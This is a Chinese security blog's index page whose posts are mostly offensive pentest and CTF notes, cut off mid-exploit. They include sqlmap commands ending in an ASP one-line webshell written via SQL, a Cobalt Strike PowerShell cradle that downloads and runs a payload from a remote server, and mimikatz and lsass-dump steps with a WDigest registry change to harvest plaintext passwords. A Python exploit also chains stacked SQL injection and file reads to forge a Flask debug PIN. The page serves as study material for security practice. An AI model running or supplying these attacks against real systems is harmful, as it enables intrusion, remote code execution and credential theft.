<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">255</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2022/08/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计小记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-08-09</time><div class="content"><p>##可访问文件收集<br>如果存在反序列化，这里可以直接利用<br>.//wp-content/plugins/product-import-export-for-woo/admin/modules/product_tags/import/import.php:272 : 读取文件函数中存在变量，可能存在任意文件读取漏洞</p>
<p>如果可以覆盖文件写入的话<br>.//wp-content/plugins/woocommerce-germanized/vendor/globalcitizen/php-iban/php-iban.php:607 : 读取文件函数中存在变量，可能存在任意文件读取漏洞</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/07/05/%E4%BD%BF%E7%94%A8frp%E8%BF%9B%E8%A1%8C%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/">使用frp进行流量转发</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-07-05</time><div class="content"><h4 id="为什么使用FRP"><a href="#为什么使用FRP" class="headerlink" title="为什么使用FRP"></a><strong>为什么使用FRP</strong></h4><p>通过在具有公网 IP 的节点上部署 frp 服务端，可以轻松地将内网服务穿透到公网，同时提供诸多专业的功能特性，这包括：</p>
<ul>
<li>客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。</li>
<li>采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间。</li>
<li>代理组间的负载均衡。</li>
<li>端口复用，多个服务通过同一个服务端端口暴露。</li>
<li>多个原生支持的客户端插件(静态文件查看，HTTP、SOCK5 代理等)，便于独立使用 frp 客户端完成某些工作。</li>
<li>高度扩展性的服务端插件系统，方便结合自身需求进行功能扩展。</li>
<li>服务端和客户端 UI 页面。</li>
</ul>
<h2 id="FRP实现原理"><a href="#FRP实现原理" class="headerlink" title="FRP实现原理"></a>FRP实现原理</h2><p><strong>frp 主要由客户端(frpc)和服务端(frps)组成，服务端通常部署在具有公网 IP 的机器上，客户端通常部署在需要穿透的内网服务所在的机器上</strong>内网没有公网ip，所以使用公网服务器搭载frp，内网反连公网frp，其他人需要访问内网的发起请求时，通过frp的代理到达内网</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>1.frps frp 服务端的配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_port &#x3D; 7000</span><br></pre></td></tr></table></figure>

<p>2.frpc frp客户端，也就是你要访问的机器</p>
<p>配置：</p>
<p>server_addr是服务端的ip，server_port是服务端开放的端口，token就是token，到时候配置的代理，ip是服务器的ip，端口走的是7004，也就是remote_port</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.137.182</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token &#x3D; 9283eae321d</span><br><span class="line">tls_enable&#x3D;true</span><br><span class="line"> </span><br><span class="line">[socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">remote_port &#x3D; 7004</span><br><span class="line">plugin &#x3D; socks5</span><br></pre></td></tr></table></figure>

<p>指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frpc -c frpc_full.ini</span><br><span class="line">frps -c frps.ini</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/01/sqlmap%E6%8C%87%E4%BB%A4/">sqlmap指令</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-01</time><div class="content"><p>##access数据库+sqlmap指令<br>###get类型注入<br>1.检测是否存在注入点：<br><code>&#39;</code>、<code>and 1=1</code>、<code>and 1=2</code>、<br>2.使用sqlmap进行检测注入点是否可用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u url</span><br></pre></td></tr></table></figure>
<p>3.完整的access+sqlmap注入指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一个完整的access注入过程命令</span><br><span class="line"></span><br><span class="line">（1）注入点判断：sqlmap.py-u http:&#x2F;&#x2F;www.antian365.com&#x2F;index.asp?id&#x3D;1</span><br><span class="line"></span><br><span class="line">（2）猜数据库表:sqlmap.py -u http:&#x2F;&#x2F;www.antian365.com&#x2F;index.asp?id&#x3D;1 –tables</span><br><span class="line"></span><br><span class="line">输入线程：10，回车后开始跑表，找到合适的表后，按下ctrl+c终止跑表。</span><br><span class="line"></span><br><span class="line">（3）对某个表进行字段猜解</span><br><span class="line"></span><br><span class="line">sqlmap.py-u ” http:&#x2F;&#x2F;www.antian365.com&#x2F;index.asp?id&#x3D;1” –tables –columns -Tadmin</span><br><span class="line"></span><br><span class="line">例如获取admin表的字段如下： id,username,password</span><br><span class="line"></span><br><span class="line">（4）对admin表字段内容进行猜解</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot; http:&#x2F;&#x2F;www.antian365.com&#x2F;index.asp?id&#x3D;1&quot;--dump -T admin -C &quot;username,password&quot;  </span><br><span class="line">（5）获取明文密码或者加密密码。通过cmd5.com等在线网站进行明文密码破解。</span><br><span class="line"></span><br><span class="line">（6）寻找后台地址，并登录后台</span><br><span class="line"></span><br><span class="line">（7）通过后台管理寻求可以获取webshell的功能模块，尝试获取webshell。</span><br><span class="line"></span><br><span class="line">知道web真实路径，且可以通过脚本执行查询，则可以通过查询来获取webshell，例如网站真实路径：d:\freehost\fred200903\web\，则查询语句为：</span><br><span class="line"></span><br><span class="line">SELECT &#39;&lt;%execute request(&quot;a&quot;)%&gt;&#39; into [a] in &#39; d:\freehost\fred200903\web\x.asp;a.xls&#39;&#39;excel 8.0;&#39; from a</span><br><span class="line">Shell地址：http:&#x2F;&#x2F;www.somesite.com&#x2F; x.asp;a.xls，一句话后门密码a。</span><br></pre></td></tr></table></figure>
<p>###POST类型注入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.Accesspost登录框注入</span><br><span class="line"></span><br><span class="line">注入点：http:&#x2F;&#x2F;xxx.xxx.com&#x2F;Login.asp</span><br><span class="line"></span><br><span class="line">（1）通过burpsurte抓包保存为txt文件，使用sqlmap进行自动注入</span><br><span class="line"></span><br><span class="line">例如对着注入点使用burp抓包，保存tg .txt文件，使用命令：</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py-r tg.txt -p tfUPass</span><br><span class="line">（2）自动搜索表单的方式   </span><br><span class="line"></span><br><span class="line">sqlmap-u http:&#x2F;&#x2F;xxx.xxx.com&#x2F;Login.asp –forms</span><br><span class="line"></span><br><span class="line">（3）指定一个参数的方法</span><br><span class="line"></span><br><span class="line">sqlmap-u http:&#x2F;&#x2F;xxx.xxx.com&#x2F;Login.asp --data &quot;tfUName&#x3D;1&amp;tfUPass&#x3D;1&quot;</span><br><span class="line">2.Cookie注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;news.asp&quot;--cookie &quot;id&#x3D;1&quot; --table --level 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.sqlmap -r test.txt<br>判断是否存在注入点，test.txt中对注入点记得加个*号来做一下标记<br>2.</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">渗透测试备忘录—信息搜集</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-20</time><div class="content"><h2 id="基本架构"><a href="#基本架构" class="headerlink" title="基本架构"></a>基本架构</h2><ul>
<li>ASP+ACCESS + II5.0/6.0+Windows server 2003</li>
<li>ASPX+Mssql+iis 7.0/7.5+ Windows server 2008</li>
<li>PHP+MYSQL+IIS</li>
<li>PHP+MYSQL+Apache</li>
<li>PHP+MYSQL+IIS</li>
<li>JSP+MYSQL+Nginx</li>
<li>JSP+Mssql+Tomcat</li>
<li>Jsp+oracle+Tomcat</li>
</ul>
<h2 id="域环境判断"><a href="#域环境判断" class="headerlink" title="域环境判断"></a>域环境判断</h2><p>1.</p>
<p>查看网关IP地址、Dns的IP地址、域名、本机是否和DNS服务器处于同一网段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure>

<p>然后过反向解析查询命令nslookup来解析域名的IP地址，用解析得到的IP地址进行对比，判断域控制器和DNS服务器是否在同一台服务器上</p>
<p>2.查看系统详细信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>

<p>域如果为WORKGROUP，则表示服务器不在域内。</p>
<p>3.查询当前登录域及登录用户信息</p>
<p>“工作站域DNS名称”如果为WORKGROUP，则表示为非预环境，”登录域“用于表示当前登录的用户是域用户还是本地用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<p>4.判断主域</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure>

<p>拒绝访问——&gt;存在域，当前用户不是域用户</p>
<p>命令成功完成——&gt;存在域，且当前用户是域用户</p>
<p>工作组——&gt;找不到域</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/18/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%A4%87%E5%BF%98%E5%BD%95-shell%E5%B7%A5%E5%85%B7%E7%AF%87/">渗透工具备忘录</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-18</time><div class="content"><h2 id="webshell工具"><a href="#webshell工具" class="headerlink" title="webshell工具"></a>webshell工具</h2><h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><p>冰蝎的连接较为简单：<br>输入url和密码以后选择脚本类型即可上线</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220418212525.png" alt="image-20220418212525168"></p>
<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><h4 id="哥斯拉马生成"><a href="#哥斯拉马生成" class="headerlink" title="哥斯拉马生成"></a>哥斯拉马生成</h4><p>管理——&gt;生成——&gt;生成对应的马并选择有效载荷和加密器</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220418220633.png" alt="image-20220418220633085"></p>
<h4 id="哥斯拉马连接："><a href="#哥斯拉马连接：" class="headerlink" title="哥斯拉马连接："></a>哥斯拉马连接：</h4><p>这里需要注意的是要记得配置代理，否则会链接失败，并且加密器要和刚才的对应</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220418220559.png" alt="image-20220418220559912"></p>
<h3 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h3><p>将CS上传至公网服务器，执行一下就可以启动，接下来将此IP以及密码填入即可，然后端口是50050</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220419183004.png" alt="image-20220419183004280"></p>
<h3 id="获取beacon"><a href="#获取beacon" class="headerlink" title="获取beacon"></a>获取beacon</h3><h4 id="创建listener"><a href="#创建listener" class="headerlink" title="创建listener"></a>创建listener</h4><p>点击cobalt strike——&gt;listeners——&gt;Add（这里的端口需要设置成服务器上未使用的端口）</p>
<h4 id="web-Delivery-执行payload"><a href="#web-Delivery-执行payload" class="headerlink" title="web Delivery 执行payload"></a>web Delivery 执行payload</h4><p>选择scripted web delivery，然后生成payload</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220419192003.png" alt="image-20220419192003622"></p>
<p>接下来进行launch即可</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220419192043.png" alt="image-20220419192042891"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;110.42.xxxx:8888&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title></a><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220419191939.png" alt="image-20220419191939517"></h4><p>然后右键单击进行interact即可执行命令</p>
<h2 id="tmux快捷键操作"><a href="#tmux快捷键操作" class="headerlink" title="tmux快捷键操作"></a>tmux快捷键操作</h2><p>发现tmux大家介绍的不错，所以想尝试一下，但发现无论ctrl+a，还是ctrl+b都不好使，经过一番努力后才发现应该是ctrl+b松开后再按其他键。例如ctrl+b ？，应该先同时按ctrl+b 松开后，shift+/（即输入？）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看有所有tmux会话</span><br><span class="line">指  令：tmux ls</span><br><span class="line">快捷键：Ctrl+b s</span><br><span class="line"></span><br><span class="line"># 新建tmux窗口</span><br><span class="line">指  令：tmux new -s &lt;session-name&gt;</span><br><span class="line"></span><br><span class="line"># 重命名会话</span><br><span class="line">指  令：tmux rename-session -t &lt;old-name&gt; &lt;new-name&gt;</span><br><span class="line">快捷键：Ctrl+b $</span><br><span class="line"></span><br><span class="line"># 分离会话</span><br><span class="line">指  令：tmux detach  或者使用  exit(关闭窗口)</span><br><span class="line">快捷键：Ctrl+b d</span><br><span class="line"></span><br><span class="line"># 重新连接会话</span><br><span class="line">指  令：tmux attach -t &lt;session-name&gt;  或者使用 tmux at -t &lt;session-name&gt;</span><br><span class="line"></span><br><span class="line">#平铺当前窗格（个人很喜欢的快捷键，注意：平铺的是当前选中的窗格）</span><br><span class="line">快捷键：Ctrl+b z (再次 Ctrl+b z 则恢复)</span><br><span class="line"></span><br><span class="line"># 杀死会话</span><br><span class="line">指  令：tmux kill-session -t &lt;session-name&gt;</span><br><span class="line"></span><br><span class="line"># 切换会话</span><br><span class="line">指  令：tmux switch -t &lt;session-name&gt;</span><br><span class="line"></span><br><span class="line"># 划分上下两个窗格</span><br><span class="line">指  令：tmux split</span><br><span class="line">快捷键：Ctrl+b “</span><br><span class="line"></span><br><span class="line"># 划分左右两个窗格</span><br><span class="line">指  令：tmux split -h</span><br><span class="line">快捷键：Ctrl+b %</span><br><span class="line"></span><br><span class="line"># 光标切换到上方窗格</span><br><span class="line">指  令：tmux select-pane -U</span><br><span class="line">快捷键：Ctrl+b 方向键上</span><br><span class="line"></span><br><span class="line"># 光标切换到下方窗格</span><br><span class="line">指  令：tmux select-pane -D</span><br><span class="line">快捷键：Ctrl+b 方向键下</span><br><span class="line"></span><br><span class="line"># 光标切换到左边窗格</span><br><span class="line">指  令：tmux select-pane -L</span><br><span class="line">快捷键：Ctrl+b 方向键左</span><br><span class="line"></span><br><span class="line"># 光标切换到右边窗格</span><br><span class="line">指  令：tmux select-pane -R</span><br><span class="line">快捷键：Ctrl+b 方向键右</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/svap1/article/details/39694713">https://blog.csdn.net/svap1/article/details/39694713</a></p>
<h2 id="frp代理配置"><a href="#frp代理配置" class="headerlink" title="frp代理配置"></a>frp代理配置</h2><p>首先配置一下服务器的代理，删除frpc 和 frpc.ini，编辑frps.ini</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220420220807.png" alt="image-20220420220807853"></p>
<p>frpc.ini配置，如果换了vps 改一下ip即可</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220420220700.png" alt="image-20220420220653329" style="zoom:67%;">

<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini	#启用服务端frp</span><br></pre></td></tr></table></figure>

<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p><strong>注意：</strong><br>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>

<h3 id="windows2003"><a href="#windows2003" class="headerlink" title="windows2003"></a>windows2003</h3><p>使用管理员身份运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">#抓取密码</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
<p>cmd修改注册表命令：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">Copyreg <span class="keyword">add</span><span class="bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span></span><br><span class="line"><span class="comment">#重启或用户重新登录后可以成功抓取</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz # log</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<h3 id="获取高版本windows系统的密码凭证-procdump导出"><a href="#获取高版本windows系统的密码凭证-procdump导出" class="headerlink" title="获取高版本windows系统的密码凭证(procdump导出)"></a>获取高版本windows系统的密码凭证(procdump导出)</h3><p>使用procdump将lsass dump下来（需要管理员权限）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe 1.dmp</span><br></pre></td></tr></table></figure>

<p>将lsass.dmp下载到本地后，然后执行mimikatz:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Copymimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>为了方便复制与查看，可以输出到本地文件里面：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Copymimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> &gt; pssword.txt</span><br></pre></td></tr></table></figure>



<h2 id="crackmap"><a href="#crackmap" class="headerlink" title="crackmap"></a>crackmap</h2></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/17/2022-startCTF/">2022-starCTF</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-17</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跟着EDI打了，但是感觉环境挺坑的–</p>
<h2 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h2><p>账号密码弱口令登录，然后，通过create 一个note 可以查询，发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.60.72.85:5002&#x2F;view?note_id&#x3D;p1ee659ofrlcro12mm3kp9ey5hwg464d</span><br></pre></td></tr></table></figure>

<p>报错存在flask的debug报错页面，存在sql的堆叠注入<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220417153126.png" alt="image-20220417153125977"></p>
<p>因为是python的语言，比较有限，因此现在的思路就是读取文件伪造一下pin码：</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pin_mes</span>():</span></span><br><span class="line">    s=requests.session()</span><br><span class="line">    url=<span class="string">&quot;http://121.37.153.47:5002/view?note_id=&quot;</span></span><br><span class="line">    session=<span class="string">&quot;session=eyJjc3JmX3Rva2VuIjoiZWJiZmZjNDFlNGQ5YzQxODFjMDZhYTBjNWZjZjIyZDg2NzAzMTZkMyIsInVzZXJuYW1lIjoiYSJ9.YlpPdw.4WCCNhQrbYsuRjp00IeRuAtJZ7U&quot;</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: session,</span><br><span class="line">        <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"># 1.username，用户名</span></span><br><span class="line"><span class="comment"># 2. uuidnode，当前网络的mac地址的十进制数</span></span><br><span class="line"><span class="comment"># 3. machine_id，docker机器id</span></span><br><span class="line"><span class="comment">#docker靶机由后面三个合并：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    pin_me=[<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>,<span class="string">&#x27;/etc/machine-id&#x27;</span>,<span class="string">&#x27;/proc/self/cgroup&#x27;</span>]</span><br><span class="line">    mess=[]</span><br><span class="line">    find_data=re.compile(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;h1 style=\&quot;text-align: center\&quot;&gt;</span></span><br><span class="line"><span class="string">        (.*?)</span></span><br><span class="line"><span class="string">    &lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pin_me:</span><br><span class="line">        ran_str = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">7</span>))</span><br><span class="line">        payload=<span class="string">f&quot;1&#x27;;CREATE TABLE <span class="subst">&#123;ran_str&#125;</span> (go TEXT)%23&quot;</span></span><br><span class="line">        s.get(url+payload,headers=headers)</span><br><span class="line">        payload2=<span class="string">f&quot;1&#x27;;load data local infile \&quot;<span class="subst">&#123;i&#125;</span>\&quot; into table <span class="subst">&#123;ran_str&#125;</span>%23&quot;</span></span><br><span class="line">        s.get(url + payload2,headers=headers)</span><br><span class="line">        payload3=<span class="string">f&quot;1&#x27;union select 1,2,3,4,group_concat(go) from <span class="subst">&#123;ran_str&#125;</span>%23&quot;</span></span><br><span class="line">        r=s.get(url + payload3,headers=headers).text</span><br><span class="line">        <span class="comment">#print(r)</span></span><br><span class="line">        data=re.findall(find_data,r)</span><br><span class="line">        mess.append(data)</span><br><span class="line">    <span class="keyword">return</span> mess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pypin</span>(<span class="params">gd,ma,cg</span>):</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        <span class="string">&#x27;ctf&#x27;</span>,  <span class="comment"># username</span></span><br><span class="line">        <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">        <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">        <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    private_bits = [</span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;gd&#125;</span>&#x27;</span>,  <span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">        <span class="comment"># e86c4117-eed3-4a37-82bc-b5fa47a88e0b eabeaffb4e97696bfb087df1717743237ff21f537c0f36676dd49ae6c6065d7e</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;ma+cg&#125;</span>&#x27;</span></span><br><span class="line">        <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">            bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">        num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                              <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    print(rv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pin_data=pin_mes()</span><br><span class="line">    print(pin_data[<span class="number">1</span>])</span><br><span class="line">    gd = int(<span class="string">&quot;&quot;</span>.join(<span class="string">&quot;&quot;</span>.join(pin_data[<span class="number">1</span>]).split(<span class="string">&quot;:&quot;</span>)),<span class="number">16</span>)</span><br><span class="line">    ma=str(<span class="string">&quot;&quot;</span>.join(pin_data[<span class="number">2</span>]))</span><br><span class="line">    cg = re.findall(<span class="string">r&quot;docker/(.*?),&quot;</span>, str(pin_data[<span class="number">3</span>]))[<span class="number">0</span>]</span><br><span class="line">    